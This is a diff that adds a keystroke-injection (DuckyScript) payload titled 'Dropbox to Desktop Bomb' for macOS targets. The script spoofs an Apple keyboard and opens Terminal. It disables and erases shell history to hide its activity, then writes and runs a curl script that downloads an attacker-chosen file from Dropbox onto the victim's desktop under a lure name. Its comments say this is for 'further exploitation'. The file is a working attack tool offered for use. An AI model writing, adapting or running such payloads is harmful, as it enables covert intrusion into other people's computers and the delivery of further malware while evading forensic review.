@@ -1,0 +1,46 @@
+REM This script can be used to download files from dropbox to a target MacOs Desktop.
+REM files downloaded to the desktop can be used to trigger more complex scripts for further exploitation
+
+REM Author: Narsty
+REM Title: Dropbox to Desktop Bomb
+REM Version 1.0 MacOs
+REM Category: Execution 
+
+
+REM Replace the "<API ACCESS TOKEN HERE>" Placeholder with your actual Dropbox API token 
+REM Replace "<DROPBOX URL HERE>" with the URL of the dropbox file
+REM Replace the "<CLICK ME.mp4>"  placeholder 
+REM with what you want the name of the file to be on the target desktop
+REM Must include file format (.jpeg .doc .txt .mp4) 
+
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 500 
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
+DELAY 500
+ENTER
+ENTER
+DELAY 1000
+STRING  cd ~/Desktop
+ENTER
+DELAY 500
+STRING  echo 'ACCESS_TOKEN="<API ACCESS TOKEN HERE>"; DOWNLOAD_URL="<DROPBOX URL HERE>"; SAVE_PATH="$HOME/Desktop/<CLICK ME.mp4>"; curl -L -o "$SAVE_PATH" --header "Authorization: Bearer $ACCESS_TOKEN" "$DOWNLOAD_URL"' > download.sh
+DELAY 500
+STRING  chmod +x download.sh
+DELAY 500
+STRING  ./download.sh
+DELAY 250
+ENTER
+DELAY 7000
+GUI w
